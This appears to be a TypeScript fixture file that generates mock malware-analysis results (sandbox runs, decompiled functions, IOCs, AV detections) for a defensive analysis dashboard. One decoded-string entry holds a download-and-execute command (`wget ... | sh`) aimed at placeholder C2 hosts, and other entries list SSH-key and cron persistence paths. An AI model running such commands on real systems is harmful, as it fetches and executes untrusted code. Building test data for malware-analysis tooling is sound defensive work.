// Per-sample analysis fixtures. Each is generated from the payload hash, so a
// sample always shows the same results wherever it is opened.
import type {
  CapeRun,
  CapturedPayload,
  GhidraAnalysis,
  GithubAnalysis,
  GithubStatus,
  PayloadAnalysis,
  RevDeckRun,
  SandboxRun,
} from '../types'
import { ANALYSIS_RESULTS, PAYLOADS } from './operations'
import { createRng, hex, int, isoMinutesAgo, pick } from './random'
import type { Rng } from './random'

const seedFor = (hash: string) => Number.parseInt(hash.slice(0, 8), 16)

const C2_HOSTS = ['cnc.example.test', 'bot.example.test', 'update.example.test', '198.51.100.23', '203.0.113.9']

function iocs(rng: Rng) {
  const host = pick(rng, C2_HOSTS)
  return [
    { id: 'i1', kind: /\d/.test(host[0]) ? ('ip' as const) : ('domain' as const), value: host },
    { id: 'i2', kind: 'url' as const, value: `http://${host}/${pick(rng, ['bins.sh', 'x86', 'arm7', 'mips'])}` },
    { id: 'i3', kind: 'path' as const, value: pick(rng, ['/tmp/.x', '/var/tmp/kworker', '/dev/shm/.s']) },
  ]
}

function hexDump(rng: Rng, payload: CapturedPayload, length: number): string {
  const header = payload.kind === 'ELF' ? [0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00] : payload.kind === 'shell script' ? [...'#!/bin/sh\n'].map((c) => c.charCodeAt(0)) : [0x4d, 0x5a, 0x90, 0x00]
  const bytes = [...header, ...Array.from({ length: length - header.length }, () => int(rng, 0, 255))]
  const lines: string[] = []
  for (let offset = 0; offset < bytes.length; offset += 16) {
    const row = bytes.slice(offset, offset + 16)
    lines.push(`${offset.toString(16).padStart(8, '0')}  ${row.map((b) => b.toString(16).padStart(2, '0')).join(' ').padEnd(47)}  |${row.map((b) => (b >= 0x20 && b < 0x7f ? String.fromCharCode(b) : '.')).join('')}|`)
  }
  return lines.join('\n')
}

export function findPayload(hash: string): CapturedPayload | undefined {
  return PAYLOADS.find((p) => p.hash === hash.toLowerCase())
}

const hasResult = (analyzer: string, hash: string) => ANALYSIS_RESULTS.some((r) => r.analyzer === analyzer && r.hash === hash)

export function githubStatusFor(payload: CapturedPayload): GithubStatus | undefined {
  if (!payload.verdict) return undefined
  const roll = seedFor(payload.hash) % 10
  return roll < 7 ? 'published' : roll < 8 ? 'dry_run' : roll < 9 ? 'denylist_blocked' : 'quota_exceeded'
}

export function buildPayloadAnalysis(payload: CapturedPayload): PayloadAnalysis {
  const rng = createRng(seedFor(payload.hash))
  const risk = payload.verdict?.label === 'malicious' ? int(rng, 70, 98) : payload.verdict?.label === 'suspicious' ? int(rng, 40, 69) : int(rng, 5, 35)
  const sandbox = ANALYSIS_RESULTS.find((r) => r.analyzer === 'sandbox' && r.hash === payload.hash)
  const github = GITHUB_ANALYSES.find((g) => g.sha === payload.hash)
  return {
    payload,
    staticRisk: risk,
    packingLikelihood: int(rng, 3, 95),
    hashes: { md5: hex(rng, 32), sha1: hex(rng, 40), sha256: payload.hash, ssdeep: `96:${hex(rng, 20)}:${hex(rng, 12)}`, tlsh: `T1${hex(rng, 70).toUpperCase()}` },
    fileType: payload.kind === 'ELF' ? `ELF 32-bit LSB executable, ${payload.platform.split('/')[1] ?? 'x86'}, statically linked, stripped` : payload.kind === 'shell script' ? 'POSIX shell script, ASCII text executable' : 'PE32 executable (GUI) Intel 80386, for MS Windows',
    entryPoint: payload.kind === 'shell script' ? undefined : `0x${hex(rng, 6)}`,
    classification: payload.kind === 'shell script' ? pick(rng, ['dropper: downloads and executes per-arch binaries', 'miner installer', 'persistence: adds cron + ssh key']) : undefined,
    yara: payload.verdict?.label === 'malicious' ? [`${payload.verdict.family ?? 'Generic'}_Bot`, ...(rng() < 0.4 ? ['UPX_Packed'] : [])] : [],
    iocs: iocs(rng),
    strings: ['/bin/busybox', 'POST /cdn-cgi/', 'User-Agent: Mozilla/5.0', 'HTTP/1.1', '/proc/net/tcp', 'GETLOCALIP', 'KILLATTK', 'LOLNOGTFO'].slice(0, int(rng, 4, 8)),
    decoded: [
      { encoding: 'base64', value: `wget http://${pick(rng, C2_HOSTS)}/x -O- | sh` },
      { encoding: 'xor 0x22', value: pick(rng, ['/etc/rc.local', 'watchdog', 'dvrHelper']) },
    ],
    sections: payload.kind === 'shell script' ? [] : ['.text', '.rodata', '.data', '.bss'].map((name) => ({ name, size: int(rng, 200, 90_000), entropy: Math.round((3 + rng() * 4.9) * 100) / 100 })),
    preview: hexDump(rng, payload, 128),
    sandbox: sandbox ? { job: payload.hash, risk: sandbox.risk ?? 0, verdict: sandboxVerdict(sandbox.risk ?? 0) } : undefined,
    ghidra: hasResult('ghidra', payload.hash),
    github: github ? { status: github.status, detections: github.detections, engines: github.engines } : undefined,
  }
}

/** One verdict scale for sandbox risk, shared by every page that shows it. */
function sandboxVerdict(risk: number): SandboxRun['verdict'] {
  return risk > 70 ? 'malicious' : risk > 40 ? 'suspicious' : 'benign'
}

export function buildSandboxRun(payload: CapturedPayload): SandboxRun {
  const rng = createRng(seedFor(payload.hash) ^ 0x5a5a)
  const risk = ANALYSIS_RESULTS.find((r) => r.analyzer === 'sandbox' && r.hash === payload.hash)?.risk ?? int(rng, 20, 90)
  const host = pick(rng, C2_HOSTS)
  return {
    job: payload.hash,
    hash: payload.hash,
    at: isoMinutesAgo(int(rng, 30, 3000)),
    verdict: sandboxVerdict(risk),
    risk,
    platform: payload.platform,
    durationSeconds: int(rng, 60, 300),
    packets: int(rng, 40, 4000),
    changedPaths: ['/tmp/.x', '/etc/crontab', '/root/.ssh/authorized_keys', '/var/tmp/kworker'].slice(0, int(rng, 1, 4)),
    syscalls: ['connect', 'socket', 'fork', 'execve', 'open', 'write', 'kill'].map((name) => ({ id: name, label: name, count: int(rng, 1, 900) })).sort((a, b) => b.count - a.count),
    processesAdded: ['sh -c ./x', 'kworker/0:1 (masquerade)', 'crontab -'].slice(0, int(rng, 1, 3)),
    socketsAdded: [`tcp ${host}:${pick(rng, [23, 80, 443, 6667])} ESTABLISHED`],
    output: 'listening tun0\nconnected to C2\nattack module loaded: udpflood',
    dns: [host.match(/\d/) ? 'none' : host],
    connections: Array.from({ length: int(rng, 1, 4) }, () => ({ proto: pick(rng, ['tcp', 'udp']), dst: host, port: pick(rng, [23, 80, 443, 6667, 53]), bytes: int(rng, 60, 90_000) })),
    iocsStatic: [host, '/tmp/.x'],
    iocsDynamic: [host, `${host}:6667`],
    techniques: [
      { id: 'T1059.004', name: 'Unix Shell', tactic: 'Execution', events: int(rng, 1, 5) },
      { id: 'T1071.001', name: 'Web Protocols', tactic: 'Command and Control', events: int(rng, 1, 9) },
      { id: 'T1053.003', name: 'Cron', tactic: 'Persistence', events: int(rng, 0, 2) },
    ].filter((t) => t.events > 0),
    diagnostics: { vm: 'qemu-x86_64', snapshot: 'clean-2026-09-01', 'packet capture': 'complete', 'guest agent': 'ok', network: 'sinkholed (fake DNS + INetSim)' },
  }
}

const DECOMPILED = (name: string, host: string) => `void ${name}(void)
{
  int fd;
  struct sockaddr_in addr;

  fd = socket(AF_INET, SOCK_STREAM, 0);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(23);
  inet_pton(AF_INET, "${host}", &addr.sin_addr);
  while (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    sleep(5);
  }
  handle_commands(fd);
}`

export function buildGhidraAnalysis(payload: CapturedPayload): GhidraAnalysis {
  const rng = createRng(seedFor(payload.hash) ^ 0x9d9d)
  const host = pick(rng, C2_HOSTS)
  const names = ['main', 'connect_cnc', 'handle_commands', 'attack_udp', 'attack_syn', 'scanner_init', 'killer_init', 'table_unlock_val', 'resolve_cnc_addr', 'util_strlen']
  return {
    hash: payload.hash,
    at: isoMinutesAgo(int(rng, 60, 4000)),
    arch: payload.platform,
    functions: names.map((name) => ({ name, address: `0x${hex(rng, 6)}`, size: int(rng, 40, 2400), calls: int(rng, 0, 30), decompiled: DECOMPILED(name, host) })),
    imports: ['socket', 'connect', 'fork', 'execve', 'sleep', 'kill', 'inet_pton'].map((name) => ({ id: name, label: name, count: int(rng, 1, 40) })),
    strings: ['/bin/busybox', 'KILLATTK', 'LOLNOGTFO', '/proc/net/tcp', 'GETLOCALIP', host],
    cryptoConstants: rng() < 0.5 ? [{ name: 'ChaCha20 sigma', address: `0x${hex(rng, 6)}` }] : [],
    fuzzy: { ssdeep: `96:${hex(rng, 24)}`, tlsh: `T1${hex(rng, 64).toUpperCase()}`, imphash: hex(rng, 32) },
    capa: [
      { capability: 'create TCP socket', namespace: 'communication/socket/tcp', attck: 'T1095' },
      { capability: 'terminate process', namespace: 'host-interaction/process/terminate' },
      { capability: 'encode data using XOR', namespace: 'data-manipulation/encoding/xor', attck: 'T1027' },
    ],
    floss: { decoded: ['/etc/rc.local', 'watchdog'], stack: ['cnc', host], tight: ['KILLATTK'] },
    aiTriage: {
      summary: `Mirai-lineage bot: resolves ${host}, connects on port 23, waits for attack commands (UDP/SYN floods), and kills competing processes. No persistence of its own.`,
      model: 'qwen2.5-coder:14b',
      confidence: pick(rng, ['medium', 'high'] as const),
    },
  }
}

export const REVDECK_RUNS: RevDeckRun[] = PAYLOADS.filter((p) => p.kind !== 'shell script').filter((_, i) => i % 2 === 0).map((payload, i) => {
  const rng = createRng(seedFor(payload.hash) ^ 0x7e7e)
  const failed = i === 4
  return {
    sha: payload.hash,
    at: isoMinutesAgo(i * 210 + int(rng, 0, 90)),
    status: failed ? 'failed' : 'completed',
    verdict: failed ? '—' : pick(rng, ['botnet client', 'dropper', 'cryptominer loader']),
    summary: failed ? '' : 'Walked main → connect_cnc → handle_commands; command table decodes to flood vectors. Kill-switch string present but unused.',
    steps: failed
      ? []
      : [
          { tool: 'list_functions', input: '{}', output: '212 functions, 10 named' },
          { tool: 'decompile', input: '{"name":"main"}', output: 'calls connect_cnc, killer_init' },
          { tool: 'xrefs_to', input: '{"name":"attack_udp"}', output: 'referenced from handle_commands table' },
          { tool: 'strings', input: '{"min":6}', output: 'KILLATTK, LOLNOGTFO, /bin/busybox' },
        ],
    citations: { valid: failed ? [] : ['main@0x401000', 'handle_commands@0x401a20'], invalid: failed ? [] : rng() < 0.4 ? ['attack_http@0x402000'] : [] },
    error: failed ? 'Ghidra REST service timed out after 600s' : undefined,
  }
})

// Windows samples, plus a few others submitted to CAPE by hand (deduped).
const CAPE_SAMPLES = [...new Set([...PAYLOADS.filter((p) => p.kind === 'PE32'), ...PAYLOADS.slice(0, 3)])]

export const CAPE_RUNS: CapeRun[] = CAPE_SAMPLES.map((payload, i): CapeRun => {
  const rng = createRng(seedFor(payload.hash) ^ 0xca9e)
  const failed = i === 2
  return {
    sha: payload.hash,
    at: isoMinutesAgo(i * 330 + int(rng, 0, 120)),
    status: failed ? 'failed_analysis' : 'reported',
    malscore: failed ? 0 : Math.round(rng() * 100) / 10,
    signatures: failed
      ? []
      : [
          { name: 'antidebug_guardpages', severity: 3, description: 'Uses guard pages to detect a debugger' },
          { name: 'injection_runpe', severity: 3, description: 'Executed a process and injected code (RunPE)' },
          { name: 'network_cnc_http', severity: 2, description: 'HTTP traffic to a known C2 pattern' },
        ].slice(0, int(rng, 1, 3)),
    processes: failed ? [] : [{ pid: 2144, name: 'sample.exe', commandLine: '"C:\\Users\\user\\AppData\\Local\\Temp\\sample.exe"' }, { pid: 2210, name: 'svchost.exe', commandLine: 'svchost.exe -k netsvcs' }],
    dumps: failed ? [] : [`${hex(rng, 64)} (injected PE)`],
    config: failed ? {} : { family: pick(rng, ['AgentTesla', 'Remcos', 'AsyncRAT']), c2: pick(rng, C2_HOSTS), mutex: `Global\\${hex(rng, 8)}` },
    log: failed ? 'Analysis aborted: guest did not respond within timeout' : 'Task completed; 2 processes traced; 1 dump extracted',
  }
})

export const GITHUB_ANALYSES: GithubAnalysis[] = PAYLOADS.filter((p) => githubStatusFor(p)).map((payload) => {
  const rng = createRng(seedFor(payload.hash) ^ 0x61a1)
  const status = githubStatusFor(payload)!
  const engines = 64
  const detections = status === 'published' ? int(rng, 8, 52) : 0
  const engineNames = ['ESET', 'Kaspersky', 'Microsoft', 'Sophos', 'ClamAV', 'BitDefender', 'Avast', 'DrWeb', 'Fortinet', 'Symantec']
  return {
    sha: payload.hash,
    at: isoMinutesAgo(int(rng, 100, 6000)),
    status,
    detections,
    engines,
    risk: detections > 30 ? 'high' : detections > 10 ? 'medium' : 'low',
    family: payload.verdict?.family,
    results: engineNames.map((engine) => {
      const hit = status === 'published' && rng() < detections / engines + 0.3
      return { engine, verdict: hit ? 'malicious' : rng() < 0.1 ? 'suspicious' : 'undetected', label: hit ? `Linux/${payload.verdict?.family ?? 'Agent'}.${hex(rng, 2).toUpperCase()}` : undefined }
    }),
    yaraRules: status === 'published' ? [`auto_${payload.hash.slice(0, 8)}_strings`, `auto_${payload.hash.slice(0, 8)}_opcodes`] : [],
    repoPath: `samples/${payload.hash.slice(0, 2)}/${payload.hash}`,
  }
})
